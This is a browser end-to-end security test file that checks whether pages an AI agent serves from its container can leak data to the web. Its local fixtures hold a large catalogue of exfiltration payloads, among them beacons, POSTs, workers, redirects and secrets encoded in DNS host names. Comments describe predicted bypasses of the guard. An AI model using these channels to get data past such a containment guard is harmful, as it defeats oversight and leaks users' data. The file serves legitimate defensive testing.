// Security bench B7, claims C7.1–C7.3 (catalogue A10–A31, B2–B5): pages the agent serves on its container's ports.
// NOT part of the repo's suite. Written at 0.1.20 without the engine; run on 0.1.22 (output in results/). To run, from apps/firefox:
//   cp <bench>/e2e/b7-agent-page.e2e.ts e2e/bench-b7-agent-page.e2e.ts
//   corepack pnpm --filter firefox-ressac exec vitest run -c vitest.e2e.config.ts e2e/bench-b7-agent-page.e2e.ts
//   rm e2e/bench-b7-agent-page.e2e.ts
// Same set-up as e2e/agent-page-guard.e2e.ts: the "public" web server is 127.0.0.1 (declared public for the test),
// the agent page is on localhost, every name resolves to 127.0.0.1 (NET_PREFS), so nothing reaches the internet.
// Every probe asks the web server for /v/<name>: a name in `web.paths` is a request that left the agent page.
// Tests marked PREDICTED RED are bypasses the code reading predicts: a red there is a finding, not a broken test.
import { appendFileSync } from "node:fs";
import { mkdtemp, rm } from "node:fs/promises";
const PROBE = path.join(os.tmpdir(), "b7-probe.jsonl");
import os from "node:os";
import path from "node:path";
import { afterAll, beforeAll, expect, it } from "vitest";
import { dispatch, state, waitFor } from "./firefox";
import { launchRessac, type LaunchedRessac } from "./launch";
import type { Marionette } from "./marionette";
import { startServer } from "./server";
import { inBrowser } from "./sites";
import { NET_PREFS, netEnv, resolvedNames, SFX } from "./ui-network";

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const html = (body: string) => (_: unknown, res: any) => res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" }).end(body);

let web: Awaited<ReturnType<typeof startServer>>;
let other: Awaited<ReturnType<typeof startServer>>;
let agent: Awaited<ReturnType<typeof startServer>>;
let w: LaunchedRessac;
let m: Marionette;
let logDir: string;
/** Requests that reached the web server from a probe. */
const left = () => web.paths.filter((p) => p.startsWith("/v/"));
/** A name under SFX on the web server's port: its lookup shows in the resolver log. */
const named = (n: string) => `http://${n}.${SFX}:${web.port}`;

beforeAll(async () => {
  logDir = await mkdtemp(path.join(os.tmpdir(), "ressac-b7-dns-"));
  web = await startServer({
    routes: {
      "/arrive": html("<title>arrive</title>"),
      // The witness: an ordinary web page doing what the agent page does. Its probe must arrive, or the test proves nothing.
      "/witness": html(`<title>witness</title><img src="/v/witness-img"><script>fetch("/v/witness-fetch").catch(() => {})</script>`),
      // A28: an HTML document served under a CDN's name. Its principal is the CDN's, not an agent page's.
      "/cdn-frame": html(
        `<title>cdn-frame</title><a id="a" target="_top">x</a><form id="f" target="_top"></form>
         <script>
           // Loaded as http://unpkg.com:<web port>/cdn-frame: the web server is 127.0.0.1 on the same port.
           const to = "http://127.0.0.1:" + location.port;
           document.getElementById("a").href = to + "/v/a28-anchor-top";
           document.getElementById("f").action = to + "/v/a28-form-top";
           fetch(to + "/v/a28-fetch").catch(() => {});
           new Image().src = to + "/v/a28-img";
           try { window.open(to + "/v/a28-open"); } catch (e) {}
           const step = new URLSearchParams(location.search).get("step");
           setTimeout(() => {
             try {
               if (step === "top") top.location = to + "/v/a28-top-location";
               if (step === "anchor") document.getElementById("a").click();
               if (step === "form") document.getElementById("f").submit();
             } catch (e) {}
           }, 300);
         </script>`,
      ),
    },
  });
  other = await startServer();
  const to = web.url;
  const sub = (name: string) => `${to}/v/${name}`;
  agent = await startServer({
    routes: {
      // A10, A11, A13, A17, A19, A25, A26, A29: everything a page can ask for without a gesture.
      "/list": (_req, res) =>
        res
          .writeHead(200, {
            "Content-Type": "text/html; charset=utf-8",
            Link: `<${sub("header-preload")}>; rel=preload; as=image, <${sub("header-preconnect")}>; rel=preconnect, <${sub("header-prefetch")}>; rel=prefetch`,
            "Content-Security-Policy-Report-Only": `default-src 'none'; report-uri ${sub("csp-report")}`,
            "Reporting-Endpoints": `default="${sub("reporting")}"`,
            NEL: '{"report_to":"default","max_age":60}',
          })
          .end(`<!doctype html><title>list</title>
<link rel="icon" href="${sub("favicon")}">
<link rel="manifest" href="${sub("manifest")}">
<link rel="search" type="application/opensearchdescription+xml" href="${sub("opensearch")}">
<link rel="stylesheet" href="${sub("stylesheet")}">
<link rel="prefetch" href="${sub("prefetch")}">
<link rel="preload" as="image" href="${sub("preload")}">
<link rel="modulepreload" href="${sub("modulepreload")}">
<link rel="prerender" href="${sub("prerender")}">
<link rel="preconnect" href="${sub("preconnect")}">
<link rel="dns-prefetch" href="${to}">
<style>
  @import url("${sub("css-import")}");
  @font-face { font-family: leak; src: url("${sub("font")}"); }
  body { background: url("${sub("css-background")}"); font-family: leak; cursor: url("${sub("css-cursor")}"), auto; }
  p::after { content: url("${sub("css-content")}"); }
</style>
<p>x</p>
<img src="${sub("img")}"><img srcset="${sub("img-srcset")} 2x"><picture><source srcset="${sub("picture")}"><img></picture>
<svg width="1" height="1"><image href="${sub("svg-image")}"/><use href="${sub("svg-use")}#a"/></svg>
<input type="image" src="${sub("input-image")}">
<script src="${sub("script")}"></script><script type="module" src="${sub("script-module")}"></script>
<video src="${sub("video")}" poster="${sub("video-poster")}" autoplay muted><track src="${sub("track")}" default></video>
<audio src="${sub("audio")}" autoplay></audio>
<object data="${sub("object")}"></object><embed src="${sub("embed")}">
<iframe src="${sub("iframe")}"></iframe>
<iframe srcdoc="<img src='${sub("srcdoc-img")}'><meta http-equiv='refresh' content='0;url=${sub("srcdoc-refresh")}'>"></iframe>
<iframe sandbox="allow-scripts" srcdoc="<script>fetch('${sub("sandbox-fetch")}').catch(() => {}); new Image().src = '${sub("sandbox-img")}'</script>"></iframe>
<iframe src="data:text/html,<img src='${sub("data-frame-img")}'><script>fetch('${sub("data-frame-fetch")}').catch(() => {})</script>"></iframe>
<iframe name="sink"></iframe>
<form id="fg" method="get" action="${sub("form-get")}" target="sink"></form>
<form id="fp" method="post" action="${sub("form-post")}" target="sink"><input name="d" value="secret"></form>
<a id="ping" href="/arrive" ping="${sub("a-ping")}">ping</a>
<a id="dl" href="${sub("download")}" download>dl</a>
<script>
  const to = ${JSON.stringify(to)};
  const quiet = (f) => { try { const r = f(); if (r && r.catch) r.catch(() => {}); } catch (e) {} };
  quiet(() => fetch(to + "/v/fetch"));
  quiet(() => fetch(to + "/v/fetch-no-cors", { mode: "no-cors" }));
  quiet(() => fetch(to + "/v/fetch-post", { method: "POST", body: "secret", mode: "no-cors" }));
  quiet(() => fetch(to + "/v/fetch-keepalive", { method: "POST", body: "secret", keepalive: true, mode: "no-cors" }));
  quiet(() => { const x = new XMLHttpRequest(); x.open("GET", to + "/v/xhr"); x.send(); });
  quiet(() => { const x = new XMLHttpRequest(); x.open("POST", to + "/v/xhr-post"); x.send("secret"); });
  quiet(() => navigator.sendBeacon(to + "/v/beacon", "secret"));
  quiet(() => new EventSource(to + "/v/eventsource"));
  quiet(() => new WebSocket(to.replace("http", "ws") + "/v/websocket"));
  quiet(() => new WebTransport(to.replace("http", "https") + "/v/webtransport"));
  quiet(() => new Worker(URL.createObjectURL(new Blob(['fetch("' + to + '/v/worker-fetch").catch(() => {}); try { importScripts("' + to + '/v/worker-import") } catch (e) {}']))));
  quiet(() => new SharedWorker(URL.createObjectURL(new Blob(['fetch("' + to + '/v/sharedworker-fetch").catch(() => {})']))));
  quiet(() => import(to + "/v/dynamic-import"));
  quiet(() => { navigator.mediaSession.metadata = new MediaMetadata({ title: "x", artwork: [{ src: to + "/v/media-artwork" }] }); });
  quiet(() => document.getElementById("fg").submit());
  quiet(() => document.getElementById("fp").submit());
  quiet(() => document.getElementById("dl").click());
  quiet(() => window.open(to + "/v/window-open"));
  quiet(() => window.open(to + "/v/window-open-features", "x", "width=300,height=300"));
  quiet(() => { const f = document.createElement("iframe"); f.src = URL.createObjectURL(new Blob(['<img src="' + to + '/v/blob-frame-img">'], { type: "text/html" })); document.body.append(f); });
  quiet(() => { const l = document.createElement("link"); l.rel = "dns-prefetch"; l.href = to; document.head.append(l); });
</script>`),
      // A2: another local service, outside the agent's ports.
      "/local": html(`<title>local</title><img src="http://localhost:${other.port}/v-local/img"><script>fetch("http://localhost:${other.port}/v-local/fetch", { mode: "no-cors" }).catch(() => {}); fetch("http://localhost:${other.port}/v-local/post", { method: "POST", body: "x", mode: "no-cors" }).catch(() => {})</script>`),
      // A21: the agent's own server redirects to the web.
      "/r": (req, res) => res.writeHead(Number(new URL(req.url!, "http://x").searchParams.get("code") ?? 302), { Location: new URL(req.url!, "http://x").searchParams.get("to")! }).end(),
      "/redirects": html(
        `<title>redirects</title>` +
          [301, 302, 303, 307, 308].map((c) => `<img src="/r?code=${c}&to=${encodeURIComponent(sub(`redirect-img-${c}`))}">`).join("") +
          `<iframe src="/r?to=${encodeURIComponent(sub("redirect-iframe"))}"></iframe>` +
          `<script>fetch("/r?to=${encodeURIComponent(sub("redirect-fetch"))}").catch(() => {})</script>`,
      ),
      // B2: top-level navigations with no gesture, one per page (?how=).
      "/nav": html(
        `<title>nav</title><a id="a" href="${sub("nav-anchor-click")}">a</a><a id="b" href="${sub("nav-anchor-blank")}" target="_blank">b</a>
         <form id="f" method="post" action="${sub("nav-form-post")}"><input name="d" value="secret"></form>
         <script>
           const how = new URLSearchParams(location.search).get("how");
           const to = ${JSON.stringify(to)};
           setTimeout(() => {
             if (how === "location") location = to + "/v/nav-location";
             if (how === "replace") location.replace(to + "/v/nav-replace");
             if (how === "assign") location.assign(to + "/v/nav-assign");
             if (how === "anchor") document.getElementById("a").click();
             if (how === "blank") document.getElementById("b").click();
             if (how === "form") document.getElementById("f").submit();
             if (how === "redirect") location = "/r?to=" + encodeURIComponent(to + "/v/nav-own-redirect");
             if (how === "meta") { const x = document.createElement("meta"); x.httpEquiv = "refresh"; x.content = "0;url=" + to + "/v/nav-meta-script"; document.head.append(x); }
           }, 200);
         </script>`,
      ),
      "/meta": html(`<title>meta</title><meta http-equiv="refresh" content="0;url=${sub("nav-meta")}">`),
      "/refresh-header": (_req, res) => res.writeHead(200, { "Content-Type": "text/html", Refresh: `0; url=${sub("nav-refresh-header")}` }).end("<title>refresh-header</title>"),
      // B3: one real click, then a navigation by script `ms` later.
      "/timer": html(`<title>timer</title><p>timer</p>`),
      // A27: a window the page opens and writes into.
      "/popup": html(`<title>popup</title><p>popup</p>`),
      // A6: a CDN's name in clear text, on any port.
      "/cdn-clear": html(`<title>cdn-clear</title><img src="http://unpkg.com:${web.port}/v/cdn-cleartext?d=secret"><img src="http://cdn.jsdelivr.net:${web.port}/v/cdn-cleartext-2?d=secret">`),
      // A28: a CDN-hosted document in a frame (?step= says how it tries to leave).
      "/cdn-host": (req, res) => html(`<title>cdn-host</title><iframe src="http://unpkg.com:${web.port}/cdn-frame?step=${new URL(req.url!, "http://x").searchParams.get("step") ?? ""}"></iframe>`)(req, res),
      // A31: secrets as host names. None may be resolved.
      "/dns": html(
        `<title>dns</title>
         <link rel="dns-prefetch" href="//b7-dnsprefetch-leak.${SFX}"><link rel="preconnect" href="${named("b7-preconnect-leak")}"><link rel="prefetch" href="${named("b7-prefetch-leak")}/x">
         <link rel="stylesheet" href="${named("b7-css-leak")}/x.css"><video src="${named("b7-video-leak")}/x.mp4"></video><iframe src="${named("b7-iframe-leak")}/"></iframe>
         
         <script>
           const q = (f) => { try { const r = f(); if (r && r.catch) r.catch(() => {}); } catch (e) {} };
           q(() => navigator.sendBeacon("${named("b7-beacon-leak")}/b", "x"));
           q(() => new EventSource("${named("b7-eventsource-leak")}/e"));
           q(() => new WebTransport("https://b7-webtransport-leak.${SFX}:${web.port}/w"));
           q(() => new WebSocket("wss://b7-wss-leak.${SFX}:${web.port}/w"));
           q(() => fetch("${named("b7-post-leak")}/p", { method: "POST", body: "x", mode: "no-cors" }));
           q(() => new Worker(URL.createObjectURL(new Blob(['fetch("${named("b7-worker-leak")}/w").catch(() => {})']))));
         </script>`,
      ),
    },
  });
  // Marionette turns the popup blocker off (RecommendedPreferences): back on, as for a person. Without it, A28's
  // CDN frame opened /v/a28-open with no gesture (the guard judges that load by the frame's CDN principal: "allow").
  // The HSTS preload list would turn http://unpkg.com into https before the guard is asked (A6, A28): off, so the guard alone answers.
  w = await launchRessac({ prefs: { ...NET_PREFS, "network.stricttransportsecurity.preloadlist": false, "dom.disable_open_during_load": true }, env: { ...netEnv(logDir), RESSAC_TEST_PUBLIC_ADDRESSES: "127.0.0.1", RESSAC_CONTAINER_PORTS: `${agent.port}-${agent.port}` } });
  m = w.marionette;
  await m.setContext("chrome");
  await waitFor(m, "return !!window.ressacWindow && gBrowser.tabs.some((t) => t.hasAttribute('ressac-parking'))", (v) => v === true);
}, 120_000);
afterAll(async () => {
  await w?.close();
  await agent?.close();
  await other?.close();
  await web?.close();
  if (logDir) await rm(logDir, { recursive: true, force: true });
});

// The tab this test opened, not the selected one: a window the page opens takes the selection (B2 "blank" did).
const open = async (url: string) => {
  await dispatch(m, { type: "openTab", windowId: (await state(m)).windows[0]!.id, url, activate: true });
  const find = `const b = gBrowser.browsers.findLast((x) => x.currentURI.spec === ${JSON.stringify(url)}); window.__b7Browser = b; return !!b && !b.webProgress.isLoadingDocument`;
  try {
    await waitFor(m, find, (v) => v === true);
  } catch (e) {
    const d = await m.execute("return gBrowser.browsers.map((x) => x.currentURI.spec)");
    appendFileSync(PROBE, JSON.stringify({ url, tabs: d, agent: agent.paths.slice(-20), web: web.paths.slice(-40) }) + "\n");
    throw e;
  }
};
const current = () => m.execute<string>("return window.__b7Browser.currentURI.spec");
const page = (p: string) => `http://localhost:${agent.port}${p}`;

it("witness: an ordinary web page's image and fetch do arrive (the server records, the launch has a network)", async () => {
  await open(`${web.url}/witness`);
  await expect.poll(() => left(), { timeout: 10_000 }).toEqual(expect.arrayContaining(["/v/witness-img", "/v/witness-fetch"]));
});

it("A10–A29: no subresource, script API, form, worker, hint header or window of an agent page reaches the web", async () => {
  const before = left().length;
  await open(page("/list"));
  await sleep(6000);
  expect(agent.paths).toContain("/list");
  expect(left().slice(before), "requests that left the agent page").toEqual([]);
  expect(await current()).toBe(page("/list"));
  // No window or tab was opened to the web either.
  expect(await m.execute<string[]>("return [...Services.wm.getEnumerator('navigator:browser')].flatMap((win) => win.gBrowser.browsers.map((b) => b.currentURI.spec)).filter((u) => u.includes('/v/'))")).toEqual([]);
});

it("A2: an agent page reaches no other local service (a port outside the agent's range)", async () => {
  await open(page("/local"));
  await sleep(2000);
  expect(other.paths.filter((p) => p.startsWith("/v-local/"))).toEqual([]);
});

it("A21: a redirect from the agent's own server to the web is not followed (image, frame, fetch; 301–308)", async () => {
  const before = left().length;
  await open(page("/redirects"));
  await sleep(3000);
  expect(agent.paths.filter((p) => p === "/r").length, "the redirects were asked for").toBeGreaterThanOrEqual(7);
  expect(left().slice(before)).toEqual([]);
});

for (const how of ["location", "replace", "assign", "anchor", "blank", "form", "redirect", "meta"]) {
  it(`B2: with no gesture, a top-level navigation by ${how} does not leave`, async () => {
    const before = left().length;
    const url = page(`/nav?how=${how}`);
    await open(url);
    await sleep(2500);
    expect(left().slice(before)).toEqual([]);
    expect(await current()).toBe(url);
  });
}

it("A20: <meta refresh> and a Refresh response header to the web do not leave", async () => {
  const before = left().length;
  for (const p of ["/meta", "/refresh-header"]) {
    await open(page(p));
    await sleep(3000);
    expect(await current(), p).toBe(page(p));
  }
  expect(left().slice(before)).toEqual([]);
});

it("B5: a tab the agent opens on its own server, which answers 302 to the web, does not leave", async () => {
  const before = left().length;
  // openTab loads an http(s) address with that address's own content principal (chrome/window/tabs.ts): the hop is judged.
  await dispatch(m, { type: "openTab", windowId: (await state(m)).windows[0]!.id, url: page(`/r?to=${encodeURIComponent(`${web.url}/v/b5-agent-opened-redirect?d=secret`)}`), activate: true });
  await sleep(3000);
  expect(left().slice(before)).toEqual([]);
});

// PREDICTED RED. page-guard.ts `blocked()` returns false for every load whose triggering principal is the system's,
// and a redirect hop keeps that principal: the agent's server can send a load the user typed (address bar: controller.ts
// navigate() uses the system principal) to the web, with data in the address, with no gesture on any page.
it("B4: an address-bar load of the agent's server, which answers 302 to the web, does not leave [PREDICTED RED]", async () => {
  const before = left().length;
  await open(page("/timer"));
  await m.execute(
    "gBrowser.selectedBrowser.loadURI(Services.io.newURI(arguments[0]), { triggeringPrincipal: Services.scriptSecurityManager.getSystemPrincipal() })",
    [page(`/r?to=${encodeURIComponent(`${web.url}/v/b4-typed-redirect?d=secret`)}`)],
  );
  await sleep(3000);
  expect(left().slice(before)).toEqual([]);
});

// B3: how long one real click lets script navigate. Firefox's transient activation lasts
// dom.user_activation.transient.timeout (5 s by default); SECURITY.md only says "a click you make in it can navigate out".
for (const [ms, mustStay] of [[1000, false], [4000, false], [7000, true]] as const) {
  it(`B3: a navigation by script ${ms} ms after one click ${mustStay ? "does not leave" : "(measured: leaves or not)"}`, async () => {
    const before = left().length;
    await open(page("/timer"));
    await inBrowser(m, "gBrowser.selectedBrowser", `setTimeout(() => { location = ${JSON.stringify(`${web.url}/v/b3-after-${ms}`)}; }, ${ms}); return 0`, { gesture: true });
    await sleep(ms + 2500);
    const out = left().slice(before);
    console.log(`[B3] ${ms} ms after a click: ${out.length ? "LEFT" : "stayed"}`);
    if (mustStay) expect(out).toEqual([]);
  }, 30_000);
}

it("B3: one click lets a form POST leave at top level (measured: the stated click limit covers a body, not only an address)", async () => {
  const before = left().length;
  await open(page("/timer"));
  await inBrowser(
    m,
    "gBrowser.selectedBrowser",
    `const f = document.createElement("form"); f.method = "post"; f.action = ${JSON.stringify(`${web.url}/v/b3-click-post`)};
     const i = document.createElement("input"); i.name = "d"; i.value = "secret"; f.append(i); document.body.append(f); f.submit(); return 0`,
    { gesture: true },
  );
  await sleep(2500);
  console.log(`[B3] POST under a click: ${left().slice(before).length ? "LEFT" : "stayed"}`);
});

it("A27: a window the agent page opens (under a click) and writes into is still an agent page: its image and fetch do not leave", async () => {
  const before = left().length;
  await open(page("/popup"));
  await inBrowser(
    m,
    "gBrowser.selectedBrowser",
    `const to = ${JSON.stringify(web.url)};
     const x = window.open("about:blank");
     if (x) x.document.write('<img src="' + to + '/v/a27-blank-img"><script>fetch("' + to + '/v/a27-blank-fetch").catch(() => {}); setTimeout(() => { location = "' + to + '/v/a27-blank-nav"; }, 6500)</' + 'script>');
     const y = window.open(URL.createObjectURL(new Blob(['<img src="' + to + '/v/a27-blob-img">'], { type: "text/html" })));
     return 0`,
    { gesture: true },
  );
  // 6.5 s: past the click's transient activation, so the written window's own navigation has no gesture.
  await sleep(9500);
  expect(left().slice(before)).toEqual([]);
}, 40_000);

// PREDICTED RED (as a hardening finding). agentPageDecision allows a GET to a CDN's *name*, whatever the scheme and the
// port: in clear text the address (and the data in it) is readable on the network path, not only by the CDN.
it("A6: a clear-text GET to a CDN's name on another port does not leave [PREDICTED RED]", async () => {
  const before = left().length;
  await open(page("/cdn-clear"));
  await sleep(2500);
  expect(left().slice(before)).toEqual([]);
});

// A28. A document served under a CDN's name is not an agent page for the guard. Its subresources are still judged by the
// tab's top page (expected green); its top-level navigations are judged by its own principal only (page-guard.ts,
// `document ? [triggering principal]`): PREDICTED RED unless Firefox itself refuses a cross-origin frame's top
// navigation without a gesture. unpkg.com serves .html files of any npm package as text/html.
it("A28: a CDN-hosted frame's own fetch and image do not leave", async () => {
  const before = left().length;
  await open(page("/cdn-host"));
  await sleep(2500);
  // Since A6's fix (CDNs over https on their usual port only) this clear-text frame no longer loads at all: held earlier.
  if (!web.paths.includes("/cdn-frame")) return;
  expect(left().slice(before).filter((p) => /a28-(fetch|img|open)/.test(p))).toEqual([]);
});
for (const step of ["top", "anchor", "form"]) {
  it(`A28: a CDN-hosted frame cannot navigate the tab to the web with no gesture (${step}) [PREDICTED RED]`, async () => {
    const before = left().length;
    const url = page(`/cdn-host?step=${step}`);
    await open(url);
    await sleep(3000);
    expect(left().slice(before).filter((p) => /a28-(top-location|anchor-top|form-top)/.test(p))).toEqual([]);
    expect(await current()).toBe(url);
  });
}

it("A31: no secret put in a host name is resolved (dns-prefetch, preconnect, prefetch, css, video, frame, beacon, EventSource, WebTransport, wss, POST, worker)", async () => {
  await open(page("/dns"));
  await sleep(1500);
  // The witness: a tab's own navigation resolves its name, so the log does record lookups.
  await dispatch(m, { type: "openTab", windowId: (await state(m)).windows[0]!.id, url: `${named("b7-witness")}/arrive`, activate: true });
  await expect.poll(() => resolvedNames(logDir), { timeout: 15_000 }).toContain("b7-witness");
  await sleep(2000);
  expect((await resolvedNames(logDir)).filter((n) => n.startsWith("b7-") && n.endsWith("-leak"))).toEqual([]);
});

it("C1: the shipped prefs that close DNS prefetch, preconnect and speculative connections are in force", async () => {
  expect(
    await m.execute("return [Services.prefs.getBoolPref('network.dns.disablePrefetch'), Services.prefs.getBoolPref('network.preconnect'), Services.prefs.getIntPref('network.http.speculative-parallel-limit'), Services.prefs.getBoolPref('browser.send_pings', false)]"),
  ).toEqual([true, false, 0, false]);
});
